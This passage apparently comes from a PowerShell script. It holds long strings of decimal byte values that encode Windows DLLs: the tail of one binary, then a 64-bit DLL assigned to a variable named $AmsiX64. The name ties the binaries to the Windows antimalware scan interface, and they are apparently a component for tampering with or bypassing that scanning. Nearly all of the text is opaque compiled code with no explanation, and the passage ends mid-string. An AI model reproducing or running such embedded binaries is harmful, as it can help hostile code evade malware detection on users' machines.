0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 254 255 255 255 0 0 0 0 208 255 255 255 0 0 0 0 254 255 255 255 0 0 0 0 110 17 0 16 0 0 0 0 254 255 255 255 0 0 0 0 212 255 255 255 0 0 0 0 254 255 255 255 0 0 0 0 233 17 0 16 0 0 0 0 254 255 255 255 0 0 0 0 212 255 255 255 0 0 0 0 254 255 255 255 203 18 0 16 234 18 0 16 0 0 0 0 254 255 255 255 0 0 0 0 216 255 255 255 0 0 0 0 254 255 255 255 215 22 0 16 234 22 0 16 20 37 0 0 0 0 0 0 0 0 0 0 220 37 0 0 48 32 0 0 44 37 0 0 0 0 0 0 0 0 0 0 164 38 0 0 72 32 0 0 228 36 0 0 0 0 0 0 0 0 0 0 206 39 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 198 38 0 0 0 39 0 0 20 39 0 0 40 39 0 0 68 39 0 0 186 39 0 0 164 39 0 0 138 39 0 0 116 39 0 0 94 39 0 0 226 38 0 0 0 0 0 0 184 37 0 0 84 37 0 0 152 37 0 0 118 37 0 0 194 37 0 0 0 0 0 0 154 38 0 0 140 38 0 0 116 38 0 0 88 38 0 0 60 38 0 0 26 38 0 0 8 38 0 0 250 37 0 0 238 37 0 0 0 0 0 0 40 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 105 110 118 111 107 101 95 116 114 105 103 103 101 114 0 41 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 114 101 116 117 114 110 95 116 114 105 103 103 101 114 0 37 0 95 95 115 116 100 95 116 121 112 101 95 105 110 102 111 95 100 101 115 116 114 111 121 95 108 105 115 116 0 0 72 0 109 101 109 115 101 116 0 0 53 0 95 101 120 99 101 112 116 95 104 97 110 100 108 101 114 52 95 99 111 109 109 111 110 0 86 67 82 85 78 84 73 77 69 49 52 48 46 100 108 108 0 0 56 0 95 105 110 105 116 116 101 114 109 0 57 0 95 105 110 105 116 116 101 114 109 95 101 0 65 0 95 115 101 104 95 102 105 108 116 101 114 95 100 108 108 0 53 0 95 105 110 105 116 105 97 108 105 122 101 95 110 97 114 114 111 119 95 101 110 118 105 114 111 110 109 101 110 116 0 0 54 0 95 105 110 105 116 105 97 108 105 122 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 0 62 0 95 114 101 103 105 115 116 101 114 95 111 110 101 120 105 116 95 102 117 110 99 116 105 111 110 0 36 0 95 101 120 101 99 117 116 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 31 0 95 99 114 116 95 97 116 101 120 105 116 0 23 0 95 99 101 120 105 116 0 0 97 112 105 45 109 115 45 119 105 110 45 99 114 116 45 114 117 110 116 105 109 101 45 108 49 45 49 45 48 46 100 108 108 0 130 5 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 0 67 5 83 101 116 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 9 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 0 97 5 84 101 114 109 105 110 97 116 101 80 114 111 99 101 115 115 0 0 109 3 73 115 80 114 111 99 101 115 115 111 114 70 101 97 116 117 114 101 80 114 101 115 101 110 116 0 45 4 81 117 101 114 121 80 101 114 102 111 114 109 97 110 99 101 67 111 117 110 116 101 114 0 10 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 73 100 0 14 2 71 101 116 67 117 114 114 101 110 116 84 104 114 101 97 100 73 100 0 0 214 2 71 101 116 83 121 115 116 101 109 84 105 109 101 65 115 70 105 108 101 84 105 109 101 0 75 3 73 110 105 116 105 97 108 105 122 101 83 76 105 115 116 72 101 97 100 0 103 3 73 115 68 101 98 117 103 103 101 114 80 114 101 115 101 110 116 0 75 69 82 78 69 76 51 50 46 100 108 108 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 177 25 191 68 78 230 64 187 255 255 255 255 0 0 0 0 1 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 54 0 0 0 73 0 0 0 76 0 0 0 12 0 0 0 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 24 0 0 0 24 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 2 0 0 0 48 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 9 4 0 0 72 0 0 0 96 80 0 0 125 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 60 63 120 109 108 32 118 101 114 115 105 111 110 61 39 49 46 48 39 32 101 110 99 111 100 105 110 103 61 39 85 84 70 45 56 39 32 115 116 97 110 100 97 108 111 110 101 61 39 121 101 115 39 63 62 13 10 60 97 115 115 101 109 98 108 121 32 120 109 108 110 115 61 39 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 49 39 32 109 97 110 105 102 101 115 116 86 101 114 115 105 111 110 61 39 49 46 48 39 62 13 10 32 32 60 116 114 117 115 116 73 110 102 111 32 120 109 108 110 115 61 34 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 51 34 62 13 10 32 32 32 32 60 115 101 99 117 114 105 116 121 62 13 10 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 69 120 101 99 117 116 105 111 110 76 101 118 101 108 32 108 101 118 101 108 61 39 97 115 73 110 118 111 107 101 114 39 32 117 105 65 99 99 101 115 115 61 39 102 97 108 115 101 39 32 47 62 13 10 32 32 32 32 32 32 60 47 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 60 47 115 101 99 117 114 105 116 121 62 13 10 32 32 60 47 116 114 117 115 116 73 110 102 111 62 13 10 60 47 97 115 115 101 109 98 108 121 62 13 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 16 0 0 12 1 0 0 7 48 108 48 155 48 171 48 194 48 211 48 228 48 233 48 2 49 7 49 20 49 97 49 126 49 136 49 150 49 168 49 189 49 251 49 212 50 7 51 85 51 94 51 105 51 112 51 144 51 150 51 156 51 162 51 168 51 174 51 181 51 188 51 195 51 202 51 209 51 216 51 223 51 231 51 239 51 247 51 3 52 12 52 17 52 23 52 33 52 43 52 59 52 75 52 91 52 100 52 201 52 121 53 170 53 249 53 12 54 31 54 43 54 59 54 76 54 114 54 135 54 142 54 148 54 166 54 176 54 17 55 30 55 69 55 77 55 102 55 160 55 187 55 199 55 214 55 223 55 236 55 27 56 35 56 46 56 52 56 58 56 70 56 76 56 111 56 160 56 75 57 106 57 116 57 133 57 146 57 151 57 189 57 194 57 231 57 241 57 14 58 91 58 96 58 115 58 129 58 156 58 167 58 54 59 63 59 71 59 142 59 157 59 164 59 218 59 227 59 240 59 251 59 4 60 19 60 30 60 36 60 42 60 48 60 54 60 60 60 66 60 72 60 78 60 84 60 90 60 96 60 102 60 108 60 114 60 0 0 0 32 0 0 32 0 0 0 112 48 164 48 168 48 92 49 96 49 104 49 48 52 80 52 108 52 112 52 140 52 144 52 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\"\n    $AmsiX64 = \"77 90 144 0 3 0 0 0 4 0 0 0 255 255 0 0 184 0 0 0 0 0 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 14 31 186 14 0 180 9 205 33 184 1 76 205 33 84 104 105 115 32 112 114 111 103 114 97 109 32 99 97 110 110 111 116 32 98 101 32 114 117 110 32 105 110 32 68 79 83 32 109 111 100 101 46 13 13 10 36 0 0 0 0 0 0 0 148 172 98 253 208 205 12 174 208 205 12 174 208 205 12 174 217 181 159 174 210 205 12 174 190 150 13 175 211 205 12 174 190 150 15 175 210 205 12 174 190 150 9 175 216 205 12 174 190 150 8 175 217 205 12 174 13 50 199 174 210 205 12 174 208 205 13 174 240 205 12 174 2 150 4 175 209 205 12 174 2 150 243 174 209 205 12 174 2 150 14 175 209 205 12 174 82 105 99 104 208 205 12 174 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 69 0 0 100 134 7 0 136 29 62 87 0 0 0 0 0 0 0 0 240 0 34 32 11 2 14 0 0 16 0 0 0 28 0 0 0 0 0 0 160 19 0 0 0 16 0 0 0 0 0 128 1 0 0 0 0 16 0 0 0 2 0 0 6 0 0 0 0 0 0 0 6 0 0 0 0 0 0 0 0 128 0 0 0 4 0 0 0 0 0 0 2 0 96 1 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 0 108 38 0 0 80 0 0 0 0 96 0 0 224 1 0 0 0 64 0 0 176 1 0 0 0 0 0 0 0 0 0 0 0 112 0 0 24 0 0 0 112 33 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 224 33 0 0 148 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 248 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 46 116 101 120 116 0 0 0 211 14 0 0 0 16 0 0 0 16 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 96 46 114 100 97 116 97 0 0 128 10 0 0 0 32 0 0 0 12 0 0 0 20 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 100 97 116 97 0 0 0 64 6 0 0 0 48 0 0 0 2 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 192 46 112 100 97 116 97 0 0 176 1 0 0 0 64 0 0 0 2 0 0 0 34 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 103 102 105 100 115 0 0 16 0 0 0 0 80 0 0 0 2 0 0 0 36 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 115 114 99 0 0 0 224 1 0 0 0 96 0 0 0 2 0 0 0 38 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 101 108 111 99 0 0 24 0 0 0 0 112 0 0 0 2 0 0 0 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 66 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 51 192 195 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 102 102 15 31 132 0 0 0 0 0 72 59 13 217 31 0 0 242 117 18 72 193 193 16 102 247 193 255 255 242 117 2 242 195 72 193 201 16 233 211 3 0 0 204 204 204 72 131 236 40 133 210 116 57 131 234 1 116 40 131 234 1 116 22 131 250 1 116 10 184 1 0 0 0 72 131 196 40 195 232 142 5 0 0 235 5 232 95 5 0 0 15 182 192 72 131 196 40 195 73 139 208 72 131 196 40 233 15 0 0 0 77 133 192 15 149 193 72 131 196 40 233 44 1 0 0 72 137 92 36 8 72 137 116 36 16 72 137 124 36 32 65 86 72 131 236 32 72 139 242 76 139 241 51 201 232 2 6 0 0 132 192 117 7 51 192 233 232 0 0 0 232 150 4 0 0 138 216 136 68 36 64 64 183 1 131 61 234 36 0 0 0 116 10 185 7 0 0 0 232 62 9 0 0 199 5 212 36 0 0 1 0 0 0 232 199 4 0 0 132 192 116 103 232 110 10 0 0 72 141 13 179 10 0 0 232 6 8 0 0 232 197 8 0 0 72 141 13 206 8 0 0 232 245 7 0 0 232 224 8 0 0 72 141 21 253 15 0 0 72 141 13 238 15 0 0 232 213 12 0 0 133 192 117 41 232 96 4 0 0 132 192 116 32 72 141 21 205 15 0 0 72 141 13 190 15 0 0 232 175 12 0 0 199 5 103 36 0 0 2 0 0 0 64 50 255 138 203 232 9 7 0 0 64 132 255 15 133 78 255 255 255 232 167 8 0 0 72 139 216 72 131 56 0 116 36 72 139 200 232 78 6 0 0 132 192 116 24 72 139 27 72 139 203 232 111 10 0 0 76 139 198 186 2 0 0 0 73 139 206 255 211 255 5 156 30 0 0 184 1 0 0 0 72 139 92 36 48 72 139 116 36 56 72 139 124 36 72 72 131 196 32 65 94 195 204 72 137 92 36 8 72 137 116 36 24 87 72 131 236 32 64 138 241 139 5 104 30 0 0 51 219 133 192 127 4 51 192 235 80 255 200 137 5 86 30 0 0 232 109 3 0 0 64 138 248 136 68 36 56 131 61 195 35 0 0 2 116 10 185 7 0 0 0 232 23 8 0 0 232 102 4 0 0 137 29 172 35 0 0 232 139 4 0 0 64 138 207 232 75 6 0 0 51 210 64 138 206 232 101 6 0 0 132 192 15 149 195 139 195 72 139 92 36 48 72 139 116 36 64 72 131 196 32 95 195 204 204 72 139 196 72 137 88 32 76 137 64 24 137 80 16 72 137 72 8 86 87 65 86 72 131 236 64 77 139 240 139 250 72 139 241 141 66 255 131 248 1 119 46 232 217 0 0 0 139 216 137 68 36 48 133 192 15 132 179 0 0 0 77 139 198 139 215 72 139 206 232 182 253 255 255 139 216 137 68 36 48 133 192 15 132 152 0 0 0 131 255 1 117 8 72 139 206 232 55 11 0 0 77 139 198 139 215 72 139 206 232 74 253 255 255 139 216 137 68 36 48 131 255 1 117 52 133 192 117 39 77 139 198 51 210 72 139 206 232 46 253 255 255 77 139 198 51 210 72 139 206 232 101 253 255 255 77 139 198 51 210 72 139 206 232 96 0 0 0 131 255 1 117 4 133 219 116 4 133 255 117 12 72 139 206 232 229 10 0 0 133 255 116 5 131 255 3 117 42 77 139 198 139 215 72 139 206 232 45 253 255 255 139 216 137 68 36 48 133 192 116 19 77 139 198 139 215 72 139 206 232 30 0 0 0 139 216 137 68 36 48 235 6 51 219 137 92 36 48 139 195 72 139 92 36 120 72 131 196 64 65 94 95 94 195 72 137 92 36 8 72 137 108 36 16 72 137 116 36 24 87 72 131 236 32 72 139 29 233 13 0 0 73 139 248 139 242 72 139 233 72 133 219 117 5 141 67 1 235 18 72 139 203 232 127 8 0 0 76 139 199 139 214 72 139 205 255 211 72 139 92 36 48 72 139 108 36 56 72 139 116 36 64 72 131 196 32 95 195 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 73 139 248 139 218 72 139 241 131 250 1 117 5 232 99 5 0 0 76 139 199 139 211 72 139 206 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 233 103 254 255 255 204 204 204 64 83 72 131 236 32 72 139 217 51 201 255 21 119 12 0 0 72 139 203 255 21 6 12 0 0 255 21 32 12 0 0 72 139 200 186 9 4 0 192 72 131 196 32 91 72 255 37 76 12 0 0 72 137 76 36 8 72 131 236 56 185 23 0 0 0 232 13 10 0 0 133 192 116 7 185 2 0 0 0 205 41 72 141 13 183 28 0 0 232 170 0 0 0 72 139 68 36 56 72 137 5 158 29 0 0 72 141 68 36 56 72 131 192 8 72 137 5 46 29 0 0 72 139 5 135 29 0 0 72 137 5 248 27 0 0 72 139 68 36 64 72 137 5 252 28 0 0 199 5 210 27 0 0 9 4 0 192 199 5 204 27 0 0 1 0 0 0 199 5 214 27 0 0 1 0 0 0 184 8 0 0 0 72 107 192 0 72 141 13 206 27 0 0 72 199 4 1 2 0 0 0 184 8 0 0 0 72 107 192 0 72 139 13 70 27 0 0 72 137 76 4 32 184 8 0 0 0 72 107 192 1 72 139 13 57 27 0 0 72 137 76 4 32 72 141 13 125 12 0 0 232 0 255 255 255 72 131 196 56 195 204 204 204 64 83 86 87 72 131 236 64 72 139 217 255 21 31 11 0 0 72 139 179 248 0 0 0 51 255 69 51 192 72 141 84 36 96 72 139 206 255 21 253 10 0 0 72 133 192 116 57 72 131 100 36 56 0 72 141 76 36 104 72 139 84 36 96 76 139 200 72 137 76 36 48 76 139 198 72 141 76 36 112 72 137 76 36 40 51 201 72 137 92 36 32 255 21 190 10 0 0 255 199 131 255 2 124 177 72 131 196 64 95 94 91 195 204 204 204 72 131 236 40 232 103 8 0 0 133 192 116 33 101 72 139 4 37 48 0 0 0 72 139 72 8 235 5 72 59 200 116 20 51 192 240 72 15 177 13 64 32 0 0 117 238 50 192 72 131 196 40 195 176 1 235 247 204 204 204 72 131 236 40 232 43 8 0 0 133 192 116 7 232 94 6 0 0 235 5 232 95 8 0 0 176 1 72 131 196 40 195 72 131 236 40 51 201 232 65 1 0 0 132 192 15 149 192 72 131 196 40 195 204 204 204 72 131 236 40 232 99 8 0 0 132 192 117 4 50 192 235 18 232 86 8 0 0 132 192 117 7 232 77 8 0 0 235 236 176 1 72 131 196 40 195 72 131 236 40 232 59 8 0 0 232 54 8 0 0 176 1 72 131 196 40 195 204 204 204 72 137 92 36 8 72 137 108 36 16 72 137 116 36 24 87 72 131 236 32 73 139 249 73 139 240 139 218 72 139 233 232 152 7 0 0 133 192 117 23 131 251 1 117 18 72 139 207 232 187 5 0 0 76 139 198 51 210 72 139 205 255 215 72 139 84 36 88 139 76 36 80 72 139 92 36 48 72 139 108 36 56 72 139 116 36 64 72 131 196 32 95 233 153 7 0 0 204 204 204 72 131 236 40 232 79 7 0 0 133 192 116 16 72 141 13 72 31 0 0 72 131 196 40 233 145 7 0 0 232 106 249 255 255 133 192 117 5 232 143 7 0 0 72 131 196 40 195 72 131 236 40 51 201 232 141 7 0 0 72 131 196 40 233 132 7 0 0 64 83 72 131 236 32 15 182 5 59 31 0 0 133 201 187 1 0 0 0 15 68 195 136 5 43 31 0 0 232 46 5 0 0 232 93 7 0 0 132 192 117 4 50 192 235 20 232 80 7 0 0 132 192 117 9 51 201 232 69 7 0 0 235 234 138 195 72 131 196 32 91 195 204 204 204 72 137 92 36 8 85 72 139 236 72 131 236 64 139 217 131 249 1 15 135 166 0 0 0 232 171 6 0 0 133 192 116 43 133 219 117 39 72 141 13 160 30 0 0 232 225 6 0 0 133 192 116 4 50 192 235 122 72 141 13 164 30 0 0 232 205 6 0 0 133 192 15 148 192 235 103 72 139 21 169 24 0 0 73 131 200 255 139 194 185 64 0 0 0 131 224 63 43 200 176 1 73 211 200 76 51 194 76 137 69 224 76 137 69 232 15 16 69 224 76 137 69 240 242 15 16 77 240 15 17 5 69 30 0 0 76 137 69 224 76 137 69 232 15 16 69 224 76 137 69 240 242 15 17 13 61 30 0 0 242 15 16 77 240 15 17 5 57 30 0 0 242 15 17 13 65 30 0 0 72 139 92 36 80 72 131 196 64 93 195 185 5 0 0 0 232 84 2 0 0 204 204 204 204 72 131 236 24 76 139 193 184 77 90 0 0 102 57 5 29 232 255 255 117 124 72 99 5 80 232 255 255 72 141 21 13 232 255 255 72 141 12 16 129 57 80 69 0 0 117 98 184 11 2 0 0 102 57 65 24 117 87 76 43 194 15 183 65 20 72 141 81 24 72 3 208 15 183 65 6 72 141 12 128 76 141 12 202 72 137 20 36 73 59 209 116 24 139 74 12 76 59 193 114 10 139 66 8 3 193 76 59 192 114 8 72 131 194 40 235 223 51 210 72 133 210 117 4 50 192 235 23 247 66 36 0 0 0 128 116 4 50 192 235 10 176 1 235 6 50 192 235 2 50 192 72 131 196 24 195 64 83 72 131 236 32 138 217 232 83 5 0 0 51 210 133 192 116 11 132 219 117 7 72 135 21 62 29 0 0 72 131 196 32 91 195 64 83 72 131 236 32 128 61 99 29 0 0 0 138 217 116 4 132 210 117 14 138 203 232 144 5 0 0 138 203 232 137 5 0 0 176 1 72 131 196 32 91 195 204 64 83 72 131 236 32 72 139 21 55 23 0 0 72 139 217 139 202 72 51 21 251 28 0 0 131 225 63 72 211 202 72 131 250 255 117 10 72 139 203 232 63 5 0 0 235 15 72 139 211 72 141 13 219 28 0 0 232 34 5 0 0 51 201 133 192 72 15 68 203 72 139 193 72 131 196 32 91 195 204 72 131 236 40 232 167 255 255 255 72 247 216 27 192 247 216 255 200 72 131 196 40 195 204 72 137 92 36 32 85 72 139 236 72 131 236 32 72 131 101 24 0 72 187 50 162 223 45 153 43 0 0 72 139 5 185 22 0 0 72 59 195 117 111 72 141 77 24 255 21 226 6 0 0 72 139 69 24 72 137 69 16 255 21 220 6 0 0 139 192 72 49 69 16 255 21 216 6 0 0 139 192 72 141 77 32 72 49 69 16 255 21 208 6 0 0 139 69 32 72 141 77 16 72 193 224 32 72 51 69 32 72 51 69 16 72 51 193 72 185 255 255 255 255 255 255 0 0 72 35 193 72 185 51 162 223 45 153 43 0 0 72 59 195 72 15 68 193 72 137 5 69 22 0 0 72 139 92 36 72 72 247 208 72 137 5 62 22 0 0 72 131 196 32 93 195 72 141 13 57 28 0 0 72 255 37 82 6 0 0 204 204 72 141 13 41 28 0 0 233 6 4 0 0 72 141 5 45 28 0 0 195 72 141 5 45 28 0 0 195 72 131 236 40 232 231 255 255 255 72 131 8 4 232 230 255 255 255 72 131 8 2 72 131 196 40 195 204 72 141 5 25 28 0 0 195 72 137 92 36 8 85 72 141 172 36 64 251 255 255 72 129 236 192 5 0 0 139 217 185 23 0 0 0 232 243 3 0 0 133 192 116 4 139 203 205 41 131 37 224 27 0 0 0 72 141 77 240 51 210 65 184 208 4 0 0 232 151 3 0 0 72 141 77 240 255 21 173 5 0 0 72 139 157 232 0 0 0 72 141 149 216 4 0 0 72 139 203 69 51 192 255 21 139 5 0 0 72 133 192 116 60 72 131 100 36 56 0 72 141 141 224 4 0 0 72 139 149 216 4 0 0 76 139 200 72 137 76 36 48 76 139 195 72 141 141 232 4 0 0 72 137 76 36 40 72 141 77 240 72 137 76 36 32 51 201 255 21 66 5 0 0 72 139 133 200 4 0 0 72 141 76 36 80 72 137 133 232 0 0 0 51 210 72 141 133 200 4 0 0 65 184 152 0 0 0 72 131 192 8 72 137 133 136 0 0 0 232 0 3 0 0 72 139 133 200 4 0 0 72 137 68 36 96 199 68 36 80 21 0 0 64 199 68 36 84 1 0 0 0 255 21 14 5 0 0 131 248 1 72 141 68 36 80 72 137 68 36 64 72 141 69 240 15 148 195 72 137 68 36 72 51 201 255 21 45 5 0 0 72 141 76 36 64 255 21 186 4 0 0 133 192 117 10 246 219 27 192 33 5 220 26 0 0 72 139 156 36 208 5 0 0 72 129 196 192 5 0 0 93 195 204 204 204 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 72 141 29 154 9 0 0 72 141 53 147 9 0 0 235 22 72 139 59 72 133 255 116 10 72 139 207 232 105 0 0 0 255 215 72 131 195 8 72 59 222 114 229 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 195 204 204 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 72 141 29 94 9 0 0 72 141 53 87 9 0 0 235 22 72 139 59 72 133 255 116 10 72 139 207 232 29 0 0 0 255 215 72 131 195 8 72 59 222 114 229 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 195 204 204 72 255 37 241 4 0 0 204 72 137 92 36 16 85 72 139 236 72 131 236 32 131 101 232 0 51 201 51 192 199 5 245 19 0 0 2 0 0 0 15 162 68 139 193 199 5 226 19 0 0 1 0 0 0 65 129 240 110 116 101 108 68 139 202 65 129 241 105 110 101 73 68 139 210 69 11 200 139 211 129 242 71 101 110 117 68 139 216 68 11 202 184 1 0 0 0 65 15 148 192 129 241 99 65 77 68 129 243 65 117 116 104 65 129 242 101 110 116 105 65 11 218 11 217 65 15 148 194 51 201 15 162 68 139 201 137 69 240 69 132 192 68 137 77 248 68 139 5 156 25 0 0 139 200 137 93 244 137 85 252 116 82 72 131 13 118 19 0 0 255 65 131 200 4 37 240 63 255 15 68 137 5 122 25 0 0 61 192 6 1 0 116 40 61 96 6 2 0 116 33 61 112 6 2 0 116 26 5 176 249 252 255 131 248 32 119 27 72 187 1 0 1 0 1 0 0 0 72 15 163 195 115 11 65 131 200 1 68 137 5 64 25 0 0 69 132 210 116 25 129 225 0 15 240 15 129 249 0 15 96 0 124 11 65 131 200 4 68 137 5 34 25 0 0 184 7 0 0 0 137 85 224 68 137 77 228 68 59 216 124 36 51 201 15 162 137 69 240 137 93 244 137 77 248 137 85 252 137 93 232 15 186 227 9 115 11 65 131 200 2 68 137 5 237 24 0 0 